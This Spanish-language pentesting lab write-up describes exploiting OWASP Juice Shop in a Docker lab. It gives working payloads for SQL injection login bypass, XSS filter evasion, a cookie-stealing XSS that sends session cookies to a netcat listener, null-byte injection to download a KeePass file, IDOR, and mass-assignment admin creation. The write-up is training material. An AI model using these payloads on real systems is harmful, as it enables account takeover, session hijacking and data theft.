# Laboratorio de Pentesting 1: Reconocimiento y Explotación Básica

Este documento resume las actividades realizadas durante la sesión de pentesting, cubriendo la configuración del entorno, las herramientas utilizadas y las vulnerabilidades descubiertas y explotadas.

## 1. Objetivo

El objetivo era crear un entorno de laboratorio controlado para practicar técnicas de hacking ético sobre aplicaciones web deliberadamente vulnerables.

## 2. Configuración del Entorno

Se utilizó Docker para crear un entorno aislado compuesto por:
- Una red aislada: `red-pentesting-aislada`
- Un contenedor de ataque: `kali-attacker` (basado en `kalilinux/kali-rolling`)
- Dos contenedores objetivo:
    - `juiceshop-target` (basado en `bkimminich/juice-shop`)
    - `webgoat-target` (basado en `webgoat/webgoat`)

### Comandos Clave de Configuración:
```bash
# Crear la red
docker network create red-pentesting-aislada

# Iniciar contenedores de objetivos en segundo plano
docker run -d --network red-pentesting-aislada --name juiceshop-target -p 3000:3000 bkimminich/juice-shop
docker run -d --network red-pentesting-aislada --name webgoat-target -p 8080:8080 webgoat/webgoat

# Iniciar contenedor de ataque y mantenerlo activo
docker run -d --rm --network red-pentesting-aislada --name kali-attacker kalilinux/kali-rolling tail -f /dev/null
```

## 3. Herramientas Instaladas en Kali

La imagen base de Kali era minimalista. Se instalaron las siguientes herramientas según fue necesario:
- `iputils-ping`: Para pruebas básicas de conectividad.
- `nmap`: Para escaneo de puertos y descubrimiento de servicios.
- `whatweb`: Para identificación de tecnologías web.
- `curl`: Para interactuar con servicios HTTP desde la línea de comandos.
- `seclists`: Colección de listas de palabras para ataques de fuerza bruta.
- `gobuster`: Para fuerza bruta de directorios y ficheros.

## 4. Vulnerabilidades Descubiertas y Explotadas (OWASP Juice Shop)

### 4.1. Inyección SQL (SQLi) en Formulario de Login
- **Descripción:** Se bypassó el sistema de autenticación inyectando una sentencia SQL en el campo de email.
- **Vector:** Formulario de Login (`/#/login`).
- **Payload:** `' or 1=1--`
- **Impacto:** Acceso no autorizado a la cuenta de administrador.

### 4.2. Cross-Site Scripting (XSS) con Bypass de Filtros
- **Descripción:** Se ejecutó código Javascript en el navegador a través del buscador de la aplicación, saltando un filtro de seguridad.
- **Fase 1 (Identificación):** `whatweb` reveló el uso de `JQuery 2.2.4`, una versión con vulnerabilidades conocidas.
- **Fase 2 (Intento Fallido):** El payload `<script>alert('XSS')</script>` fue bloqueado, indicando la existencia de un filtro.
- **Fase 3 (Bypass y Explotación):** El payload `<img src=x onerror=alert('XSSv2')>` evitó el filtro y se ejecutó con éxito.
- **Impacto:** Demostración de la capacidad de ejecutar scripts arbitrarios en el contexto del sitio web.

### 4.2.1. Robo de Cookies (Session Hijacking)
- **Descripción:** Se evolucionó el ataque XSS para robar las cookies de sesión de un usuario.
- **Fase 1 (Preparación del Atacante):** Se obtuvo la IP del contenedor `kali-attacker` (`172.19.0.4`) y se inició un listener en el puerto 8888 con `netcat` para recibir la cookie.
    - `docker exec -d kali-attacker nc -l -p 8888 -v`
- **Fase 2 (Payload Avanzado):** Se creó un payload que, al ejecutarse, envía la cookie de la víctima al listener del atacante. Se usó el handler `onerror` para evadir los filtros.
    - **Payload:** `<img src=x onerror="document.location='http://172.19.0.4:8888/?cookie=' + document.cookie">`
- **Fase 3 (Captura):** El listener en `kali-attacker` recibió la petición HTTP con la cookie de la víctima en la URL.
- **Impacto:** Robo de la cookie de sesión, permitiendo a un atacante realizar un ataque de "Session Hijacking" para suplantar la identidad de la víctima.

### 4.3. Broken Access Control y Exfiltración de Datos
- **Descripción:** Se descubrió un directorio `/ftp` accesible públicamente que contenía ficheros sensibles. Se bypassó un segundo filtro para poder descargar ficheros no autorizados.
- **Fase 1 (Descubrimiento):** `gobuster` reveló la existencia del directorio `/ftp`.
- **Fase 2 (Intento de Acceso Fallido):** Se intentó descargar `suspicious_errors.yml` pero un filtro en el servidor lo impidió, permitiendo solo ficheros `.md` y `.pdf`.
- **Fase 3 (Bypass y Exfiltración):** Se utilizó un ataque de "[Null Byte Injection](../FAQ_CONCEPTOS.md#9-null-byte-injection-inyeccion-de-byte-nulo)" para engañar al filtro.
    - **Payload:** `.../incident-support.kdbx%2500.md`
    - **Comando:** `curl [URL_CON_PAYLOAD] -o [FICHERO_SALIDA]`
- **Impacto:** Exfiltración exitosa de una base de datos de contraseñas KeePass (`incident-support.kdbx`).

### 4.4. Security Misconfiguration - Exposición del Scoreboard
- **Descripción:** Se accedió al panel de puntuación oculto (`Score Board`) que debería estar restringido o no existir en un entorno de producción real.
- **Fase 1 (Descubrimiento):** Se identificó la ruta `/#/score-board` mediante técnicas de reconocimiento de rutas o inspección de los archivos JavaScript del cliente (Open Source Intelligence sobre la propia aplicación).
- **Fase 2 (Explotación):** Navegación directa a la URL `http://localhost:3000/#/score-board`, evitando cualquier restricción de menú.
- **Impacto:** Revelación de información sobre la infraestructura de retos, facilitando al atacante la identificación de otras vulnerabilidades potenciales.

### 4.5. Improper Error Handling (Information Leakage)
- **Descripción:** La aplicación no gestiona adecuadamente los errores internos, revelando "Stack Traces" completos al usuario final cuando se solicitan archivos inválidos en rutas protegidas.
- **Vector:** `http://localhost:3000/ftp/juicy-markup-error` (o archivos ilegales).
- **Evidencia (Stack Trace parcial):**
    ```text
    Error: Only .md and .pdf files are allowed!
    at verify (/juice-shop/build/routes/fileServer.js:59:18)
    at ...
    ```
- **Información Revelada:**
    - Framework y Versión: `Express ^4.21.0`
    - Estructura de Directorios Interna: `/juice-shop/build/routes/...`
    - Lógica de Validación: Función `verify` en `fileServer.js`.
- **Impacto:** Facilita la fase de reconocimiento de un atacante (Fingerprinting) al exponer tecnologías y rutas internas sin necesidad de herramientas de fuerza bruta.

### 4.6. DOM-based XSS (Cross-Site Scripting)
- **Descripción:** A diferencia del XSS reflejado tradicional, este ataque se ejecuta completamente en el lado del cliente. El código JavaScript de la aplicación lee el parámetro de búsqueda desde la URL (`location.hash`) y lo inserta directamente en el DOM sin sanitización.
- **Vector:** Parámetro de búsqueda en la URL.
- **Payload:**
    ```
    http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
    ```
- **Diferencia con XSS Reflejado:** 
    - **XSS Reflejado:** El payload viaja al servidor y vuelve en la respuesta HTTP.
    - **DOM XSS:** El payload nunca llega al servidor, el JavaScript del cliente lo procesa directamente.
- **Impacto:** Ejecución de código arbitrario en el navegador de la víctima. Puede usarse para robo de cookies, redirección a sitios maliciosos o defacement.

### 4.7. Sensitive Data Exposure - Directory Listing
- **Descripción:** El directorio `/ftp` es accesible públicamente y permite listar su contenido, revelando archivos sensibles que no deberían estar expuestos.
- **Vector:** Navegación directa a `http://localhost:3000/ftp`
- **Archivos Sensibles Descubiertos:**
    - `acquisitions.md` - Información corporativa
    - `coupons_2013.md.bak` - Cupones históricos
    - `eastere.gg` - Archivo de easter egg
    - `incident-support.kdbx` - Base de datos de contraseñas KeePass
    - `legal.md` - Documentación legal
    - `package.json.bak` - Configuración de dependencias (revela versiones)
    - `suspicious_errors.yml` - Logs de errores del sistema
- **Explotación Adicional:** Combinado con Null Byte Injection (`%2500.md`), se logró descargar archivos restringidos.
- **Impacto:** Exposición de información confidencial, incluyendo credenciales almacenadas en formato cifrado (KeePass).

### 4.8. Broken Access Control - IDOR (Cesta de Compra Ajena) [Tema 6.6]
- **Objetivo:** Ver el contenido del carrito de compra de otro usuario manipulando identificadores directos.
- **Vector:** `http://localhost:3000/rest/basket/[BASKET_ID]`
- **Procedimiento (Guía Práctica):**
    1.  Loguearse con un usuario propio y abrir las herramientas de desarrollador (F12).
    2.  Buscar en el `Session Storage` o en las peticiones de red el `bid` (Basket ID).
    3.  Interceptar una petición de "ver carrito" y cambiar el número del ID (ej. de `1` a `2`).
    4.  **Resultado:** El servidor devuelve los ítems del carrito de otro usuario sin verificar si somos los propietarios.
- **Concepto Clave:** Autorización defectuosa a nivel de objeto.

### 4.9. Mass Assignment - Registro de Admin (API Exploitation) [Tema 6.8]
- **Objetivo:** Registrar un usuario nuevo con privilegios de Administrador aprovechando la asignación masiva.
- **Vector:** API REST endpoint `/api/Users`.
- **Procedimiento (Guía Práctica):**
    1.  Iniciar el proceso de registro normal e interceptar la petición `POST` con Burp Suite o analizarla en la pestaña Network.
    2.  Observar el cuerpo JSON: `{"email":"...","password":"..."}`.
    3.  Añadir manualmente el parámetro: `"role": "admin"`.
    4.  Enviar la petición modificada.
    5.  **Resultado:** El backend confía ciegamente en los parámetros recibidos y crea el usuario con rol de admin.
- **Concepto Clave:** Vulnerabilidad de diseño en APIs REST que no sanean los objetos de entrada.

